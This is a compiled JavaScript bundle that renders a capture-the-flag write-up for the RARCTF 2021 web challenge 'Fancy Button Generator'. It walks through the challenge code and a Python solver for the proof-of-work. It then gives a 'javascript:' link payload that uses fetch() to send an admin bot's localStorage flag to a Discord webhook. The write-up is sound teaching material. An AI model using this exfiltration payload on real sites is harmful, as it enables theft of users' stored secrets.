"use strict";(self.webpackChunkwriteups_docs=self.webpackChunkwriteups_docs||[]).push([[617],{3905:(e,t,n)=>{n.d(t,{Zo:()=>d,kt:()=>g});var o=n(7294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function r(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);t&&(o=o.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,o)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?r(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):r(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,o,a=function(e,t){if(null==e)return{};var n,o,a={},r=Object.keys(e);for(o=0;o<r.length;o++)n=r[o],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);for(o=0;o<r.length;o++)n=r[o],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var l=o.createContext({}),c=function(e){var t=o.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},d=function(e){var t=c(e.components);return o.createElement(l.Provider,{value:t},e.children)},p="mdxType",h={inlineCode:"code",wrapper:function(e){var t=e.children;return o.createElement(o.Fragment,{},t)}},u=o.forwardRef((function(e,t){var n=e.components,a=e.mdxType,r=e.originalType,l=e.parentName,d=s(e,["components","mdxType","originalType","parentName"]),p=c(n),u=a,g=p["".concat(l,".").concat(u)]||p[u]||h[u]||r;return n?o.createElement(g,i(i({ref:t},d),{},{components:n})):o.createElement(g,i({ref:t},d))}));function g(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var r=n.length,i=new Array(r);i[0]=u;var s={};for(var l in t)hasOwnProperty.call(t,l)&&(s[l]=t[l]);s.originalType=e,s[p]="string"==typeof e?e:a,i[1]=s;for(var c=2;c<r;c++)i[c]=n[c];return o.createElement.apply(null,i)}return o.createElement.apply(null,n)}u.displayName="MDXCreateElement"},9447:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>i,default:()=>p,frontMatter:()=>r,metadata:()=>s,toc:()=>c});var o=n(7462),a=(n(7294),n(3905));const r={},i="FANCY_BUTTON_GENERATOR",s={unversionedId:"2021/RARCTF/challenges/fancy_button_generator",id:"2021/RARCTF/challenges/fancy_button_generator",title:"FANCY_BUTTON_GENERATOR",description:"Challenge generals information",source:"@site/docs/2021/RARCTF/challenges/fancy_button_generator.md",sourceDirName:"2021/RARCTF/challenges",slug:"/2021/RARCTF/challenges/fancy_button_generator",permalink:"/docs/2021/RARCTF/challenges/fancy_button_generator",draft:!1,editUrl:"https://github.com/Pynard/writeups-docs/tree/main/packages/create-docusaurus/templates/shared/docs/2021/RARCTF/challenges/fancy_button_generator.md",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"DOTTY",permalink:"/docs/2021/RARCTF/challenges/dotty"},next:{title:"INFINITE_FREE_TRIAL",permalink:"/docs/2021/RARCTF/challenges/infinite_free_trial"}},l={},c=[{value:"Challenge generals information",id:"challenge-generals-information",level:2},{value:"I - Understand the code",id:"i---understand-the-code",level:2},{value:"II - Be accepted by the server",id:"ii---be-accepted-by-the-server",level:2},{value:"III - Send our button",id:"iii---send-our-button",level:2}],d={toc:c};function p(e){let{components:t,...n}=e;return(0,a.kt)("wrapper",(0,o.Z)({},d,n,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"fancy_button_generator"},"FANCY_BUTTON_GENERATOR"),(0,a.kt)("h2",{id:"challenge-generals-information"},"Challenge generals information"),(0,a.kt)("p",null,"CTF website: ",(0,a.kt)("a",{parentName:"p",href:"https://ctf.rars.win/"},"https://ctf.rars.win/")," \\\nChallenge page: ",(0,a.kt)("a",{parentName:"p",href:"https://ctf.rars.win/campaign/web/fancy-button-generator"},"https://ctf.rars.win/campaign/web/fancy-button-generator"),"\nLinked files:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"- A directory containing the entire code\n- a link to the hosted code (https://fbg.rars.win/).\n")),(0,a.kt)("h2",{id:"i---understand-the-code"},"I - Understand the code"),(0,a.kt)("p",null,"The code is divided in two parts: "),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"The admin code, a node.js code,"),(0,a.kt)("li",{parentName:"ul"},"The server code, a Flask (python) code.")),(0,a.kt)("p",null,"By reading the server code, we can understand that it's the one loading the page at ",(0,a.kt)("a",{parentName:"p",href:"https://fbg.rars.win/"},"https://fbg.rars.win/"),'.\nWe can also see that this code offer a possibility to share our generated button with an admin.\nDoing this, the server send a request to "/xss/add", which is a route managed by the admin node.js code.\nThis allows us to think that the admin code is the one that will receive and evaluate our button.'),(0,a.kt)("p",null,"By reading the admin code, we can see that the flag (because it's the name of the variable) is located inside env\nvariable, and is stored inside the localStorage of the page created to click on our button. This allows us to see the\npath to this flag:"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Send a button to be the server, and being accepted to be able to send it to the admin,"),(0,a.kt)("li",{parentName:"ul"},"Send admin specific information that allow him to send us the flag while it is testing our button.")),(0,a.kt)("h2",{id:"ii---be-accepted-by-the-server"},"II - Be accepted by the server"),(0,a.kt)("p",null,"By looking inside server.py code, we can see that we need to send a request to /pow if we want to be verified\n(",(0,a.kt)("inlineCode",{parentName:"p"},"session['verified'] = True"),"). For this, we need to send him the solution of a test, using two parameters.\nFirst, we should send a get request to the server/pow to get these parameters, use the functions given inside pow.py\nin order to find the solution, and send the solution in post to the server to be verified for 30 seconds."),(0,a.kt)("p",null,"To do this, we simply need to run this python code :"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-python"},'import requests\nfrom pow_fun import solve\n\nhost = "https://fbg.rars.win/"\ns = requests.Session()\ndata = s.get(host + "pow").json()\nsolution = solve(data[\'pref\'], data[\'suff\'], 5)\ns.post(host + "pow", json={"answer": solution})\n')),(0,a.kt)("h2",{id:"iii---send-our-button"},"III - Send our button"),(0,a.kt)("p",null,"While testing the button, the admin will click on it. This action will open a new page with it's own empty local\nstorages, so send the admin to a page with a JS code I typed myself didn't work.\nWe can also put a link that don't send the admin to another page, but make him run a JS code locally on the same page\n(with the flag in the localStorage) by sending a link like : ",(0,a.kt)("inlineCode",{parentName:"p"},"javascript: <my_js_code>"),". Then, while testing the button,\nthe admin will run our javascript code.\nFor this code, I choosed to make him send me the flag on a discord webhook:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-javascript"},"fetch(\n    'https://discord.com/api/webhooks/link/to/my/webhook',\n    {\n        'method':'POST',\n        'headers':\n            {\n                'content-type':'application/json'\n            },\n        'body': JSON.stringify( \n            {\n                'content': localStorage.flag  // AKA 'content': 'message to send'\n            })\n    });\n")),(0,a.kt)("p",null,"that give us a link like:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-python"},"link = \"javascript:fetch('https://discord.com/api/webhooks/link/to/my/webhook',{'method':'POST','headers':{'content-type':'application/json'},'body': JSON.stringify({'content': localStorage.flag})});\";\n")),(0,a.kt)("p",null,"And so send this link to the admin will make him send the flag to us my discord message."),(0,a.kt)("p",null,"So finally, executing the following python code: "),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-python"},"import requests\nfrom pow_fun import solve\n\n# For server registration\nhost = \"https://fbg.rars.win/\"\ns = requests.Session()\ndata = s.get(host + \"pow\").json()\nsolution = solve(data['pref'], data['suff'], 5)\ns.post(host + \"pow\", json={\"answer\": solution})\n\n# For admin\nbutton_title = \"give me flag plz\"\nlink = \"javascript:fetch('https://discord.com/api/webhooks/link/to/my/webhook',{'method':'POST','headers':{'content-type':'application/json'},'body': JSON.stringify({'content': localStorage.flag})});\";\nr = s.get(host + \"admin\", params={\"title\": button_title, \"link\": link})\n")),(0,a.kt)("p",null,"Will give us the flag:\\\n",(0,a.kt)("img",{parentName:"p",src:"https://drive.google.com/uc?export=view&id=1imPbgRPgoEj6q5LluehxqRDZcaDQfj5L",alt:"flag"})))}p.isMDXComponent=!0}}]);